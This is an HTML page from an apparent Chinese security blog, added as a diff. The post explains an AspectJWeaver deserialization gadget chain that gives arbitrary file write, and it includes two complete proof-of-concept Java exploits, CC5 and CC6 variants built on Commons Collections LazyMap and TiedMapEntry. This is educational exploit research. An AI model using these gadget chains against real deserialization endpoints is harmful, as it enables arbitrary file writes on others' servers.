@@ -1,0 +1,703 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/I.png">
+  <link rel="icon" href="/img/I.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Infernity">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="AspectJWeaver 是 AspectJ 框架的一部分，是一个用于实现面向切面编程（POA）的工具。AspectJWeaver 提供了在 Java 程序中使用 AspectJ 的功能，并通过字节码操纵技术来织入切面代码到应用程序的目标类中。 这篇文章不聊怎么任意利用文件写入进而来RCE，只学习一下如何利用AspectJWeaver通过反序列化来进行任意文件写入。 依赖123456789101">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Aspectjweaver反序列化">
+<meta property="og:url" content="http://example.com/2025/03/24/Aspectjweaver%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="Infernity&#39;s Blog">
+<meta property="og:description" content="AspectJWeaver 是 AspectJ 框架的一部分，是一个用于实现面向切面编程（POA）的工具。AspectJWeaver 提供了在 Java 程序中使用 AspectJ 的功能，并通过字节码操纵技术来织入切面代码到应用程序的目标类中。 这篇文章不聊怎么任意利用文件写入进而来RCE，只学习一下如何利用AspectJWeaver通过反序列化来进行任意文件写入。 依赖123456789101">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/Aspectjweaver%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Aspectjweaver.jpg">
+<meta property="article:published_time" content="2025-03-24T05:33:30.000Z">
+<meta property="article:modified_time" content="2025-03-24T09:43:04.608Z">
+<meta property="article:author" content="Infernity">
+<meta property="article:tag" content="JAVA">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/Aspectjweaver%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Aspectjweaver.jpg">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>Aspectjweaver反序列化 - Infernity&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":150,"cursorChar":"_","loop":true,"scope":["home"]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Infernity&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/friends/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>friends</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/background/19.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle">Aspectjweaver反序列化</span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-03-24 13:33" pubdate>
+          2025年3月24日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          10 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Aspectjweaver反序列化</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>AspectJWeaver 是 AspectJ 框架的一部分，是一个用于实现面向切面编程（POA）的工具。AspectJWeaver 提供了在 Java 程序中使用 AspectJ 的功能，并通过字节码操纵技术来织入切面代码到应用程序的目标类中。</p>
+<p>这篇文章不聊怎么任意利用文件写入进而来RCE，只学习一下如何利用AspectJWeaver<strong>通过反序列化来进行任意文件写入</strong>。</p>
+<h2 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.aspectj<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>aspectjweaver<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.9.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="链子寻找"><a href="#链子寻找" class="headerlink" title="链子寻找"></a>链子寻找</h2><p>这条链子也很简单，看到关键类SimpleCache$StoreableCachingMap：</p>
+<p><img src="/img/Aspectjweaver%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/StoreableCachingMap.png" srcset="/img/loading.gif" lazyload alt="StoreableCachingMap"></p>
+<p>这个类是继承的HashMap类，并且重写了HashMap的put方法。</p>
+<p>这段代码的功能是将键值对添加到映射中。根据 <code>value</code> 的不同情况，可能会将路径设置为 “IDEM” 或使用 <code>writeToPath</code> 方法将键和值写入到某个路径中。然后，将键和路径添加到映射中，并将映射数据存储到持久化存储中。最后，返回添加结果。</p>
+<p>那个条件判断就是检查 valueBytes 是否与 <code>SimpleCache.SAME_BYTES</code> 相等。如果相等，说明 <code>value</code> 是一个特定的字节数组（<code>SimpleCache.SAME_BYTES =&quot;IDEM&quot;.getBytes();</code>），则将 path 设置为 “IDEM”。</p>
+<p>这里显然会进入到else，跟进<code>writeToPath</code>方法：</p>
+<p><img src="/img/Aspectjweaver%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/writeToPath.png" srcset="/img/loading.gif" lazyload alt="writeToPath"></p>
+<p>它创建一个文件输出流对象，将字节数组写入到文件中。而且folder可控，这里就可以达成任意路径写文件的效果了。</p>
+<p>那么由谁来触发StoreableCachingMap的<code>put</code>方法呢？</p>
+<p>刚过说了，StoreableCachingMap类是继承了HashMap类的，所以触发方法跟触发<code>HashMap.put</code>的方法是一样的。这里最常见的方法就是利用<code>LazyMap.get()</code>来触发，这在CC5和CC6链中用到过。</p>
+<p><img src="/img/Aspectjweaver%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/get.png" srcset="/img/loading.gif" lazyload alt="get"></p>
+<p>文件内容由<code>factory.transform</code>方法返回，我们可以用ConstantTransformer直接写。</p>
+<p><img src="/img/Aspectjweaver%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/ConstantTransformer.png" srcset="/img/loading.gif" lazyload alt="ConstantTransformer"></p>
+<p>CC5&#x2F;CC6链是用<code>TiedMapEntry.getValue()</code>触发来<code>LazyMap.get()</code>，也有CC1的AnnotationInvocationHandler动态代理触发<code>LazyMap.get()</code>，但遗憾的是CC1get传入的key是调用的method，我们不可控，所以不能用于改链。</p>
+<p><img src="/img/Aspectjweaver%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/getValue.png" srcset="/img/loading.gif" lazyload alt="getValue"></p>
+<p>这里直接给出poc</p>
+<h2 id="CC5-AspectJWeaver-poc："><a href="#CC5-AspectJWeaver-poc：" class="headerlink" title="CC5+AspectJWeaver poc："></a>CC5+AspectJWeaver poc：</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//反射获取构造函数</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor(String.class, <span class="hljs-type">int</span>.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//实例化对象</span><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> (HashMap) constructor.newInstance(<span class="hljs-string">&quot;C:\\Users\\admin\\Desktop\\Aspectjweaver&quot;</span>, <span class="hljs-number">1</span>);        <span class="hljs-comment">//第一个参数是文件夹，第二个随意数字</span><br><br>        <span class="hljs-comment">// 这里用到ConstantTransformer是为了构造value，即写入文件的值</span><br>        <span class="hljs-type">ConstantTransformer</span> <span class="hljs-variable">transform</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-string">&quot;Infernity 1145141919810&quot;</span>.getBytes(StandardCharsets.UTF_8));<br><br>        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,transform);<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tidmapentry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;1.txt&quot;</span>);   <span class="hljs-comment">//第二个参数key是文件名</span><br><br>        <span class="hljs-comment">//BadAttributeValueExpException触发toString</span><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">BadAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        setValue(BadAttributeValueExpException,<span class="hljs-string">&quot;val&quot;</span>, tidmapentry);<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> serialize(BadAttributeValueExpException);<br>        unserialize(a);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-comment">//提供需要序列化的类，返回base64后的字节码</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        objectOutputStream.writeObject(obj);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());<br>        <span class="hljs-keyword">return</span> poc;<br>    &#125;<br><br><br>    <span class="hljs-comment">//提供base64后的字节码，进行反序列化</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String exp)</span> <span class="hljs-keyword">throws</span> IOException,ClassNotFoundException&#123;<br>        <span class="hljs-type">byte</span>[] bytes = Base64.getDecoder().decode(exp);<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">byteArrayInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(byteArrayInputStream);<br>        objectInputStream.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/Aspectjweaver%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/calc.png" srcset="/img/loading.gif" lazyload alt="calc"></p>
+<h2 id="CC6-AspectJWeaver-poc："><a href="#CC6-AspectJWeaver-poc：" class="headerlink" title="CC6+AspectJWeaver poc："></a>CC6+AspectJWeaver poc：</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//反射获取构造函数</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor(String.class, <span class="hljs-type">int</span>.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//实例化对象</span><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> (HashMap) constructor.newInstance(<span class="hljs-string">&quot;C:\\Users\\admin\\Desktop\\Aspectjweaver&quot;</span>, <span class="hljs-number">1</span>);        <span class="hljs-comment">//第一个参数是文件夹，第二个随意数字</span><br><br>        <span class="hljs-comment">// 这里用到ConstantTransformer是为了构造value，即写入文件的值</span><br>        <span class="hljs-type">ConstantTransformer</span> <span class="hljs-variable">transform</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-string">&quot;Infernity 1145141919810&quot;</span>.getBytes(StandardCharsets.UTF_8));<br><br>        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,transform);<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tidmapentry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;2.txt&quot;</span>);   <span class="hljs-comment">//第二个参数key是文件名</span><br><br>        HashMap&lt;Object,Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map2.put(tidmapentry,<span class="hljs-string">&quot;anything&quot;</span>);<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> serialize(map2);<br>        <span class="hljs-comment">//System.out.println(a);</span><br>        unserialize(a);<br>    &#125;<br><br>    <span class="hljs-comment">//提供需要序列化的类，返回base64后的字节码</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        objectOutputStream.writeObject(obj);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());<br>        <span class="hljs-keyword">return</span> poc;<br>    &#125;<br><br><br>    <span class="hljs-comment">//提供base64后的字节码，进行反序列化</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String exp)</span> <span class="hljs-keyword">throws</span> IOException,ClassNotFoundException&#123;<br>        <span class="hljs-type">byte</span>[] bytes = Base64.getDecoder().decode(exp);<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">byteArrayInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(byteArrayInputStream);<br>        objectInputStream.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这虽然在序列化的时候也会触发写文件，但是无伤大雅。反序列化的时候能触发就行。</p>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/uuzeray/article/details/136595841">https://blog.csdn.net/uuzeray/article/details/136595841</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/JAVA/" class="category-chain-item">JAVA</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/JAVA/" class="print-no-link">#JAVA</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Aspectjweaver反序列化</div>
+      <div>http://example.com/2025/03/24/Aspectjweaver反序列化/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Infernity</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年3月24日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/03/24/EventListenerList%E8%A7%A6%E5%8F%91%E4%BB%BB%E6%84%8FtoString/" title="EventListenerList触发任意toString">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">EventListenerList触发任意toString</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
